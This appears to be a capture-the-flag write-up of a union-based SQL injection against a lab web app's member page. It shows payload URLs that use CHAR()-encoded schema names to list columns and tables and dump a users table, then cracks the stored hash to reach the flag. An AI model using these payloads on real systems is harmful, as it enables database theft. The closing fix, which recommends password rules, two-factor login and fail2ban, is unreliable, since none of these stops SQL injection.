# Member Sql Injection

SQL injection usually occurs when you ask a user for input, like their username/userid, 
and instead of a name/id, the user gives you an SQL statement that you will unknowingly 
run on your database.

## Notes

CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110))

----------------------------------------------------

```bash
http://192.168.1.34/index.php
?page=member
&id=-1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110))
&Submit=Submit 
```

ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110)) 
First name: user_id
Surname : 0
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110)) 
First name: first_name
Surname : 0
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110)) 
First name: last_name
Surname : 0
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110)) 
First name: town
Surname : 0
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110)) 
First name: country
Surname : 0
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110)) 
First name: planet
Surname : 0
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110)) 
First name: Commentaire
Surname : 0
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110)) 
First name: countersign
Surname : 0


---------------------------------------------------

```bash
http://192.168.1.34/index.php
?page=member
&id=-1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110))
&Submit=Submit
```

First name: 
Surname : users

----------------------------------------------------

we found in 

```bash
http://192.168.1.34/index.php
?page=member
&id=-1 union select Commentaire, countersign from Member_Sql_Injection.users
&Submit=Submit
```

this: 

ID: -1 union select Commentaire, countersign from Member_Sql_Injection.users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

md5: 5ff9d0165b4f92b14994e5c685cdce28 = FortyTwo

Sh256: fortytwo = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

the flag is 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5


## Correction

We need to block SQL in different ways, one of the more commun in to force to the user to have difficult password adding to the code for example: 1 letter A, 1 signe, etc... have one authentificator is a good idea swell or email connection sending, have maximum of try (3 attempts), fail2ban.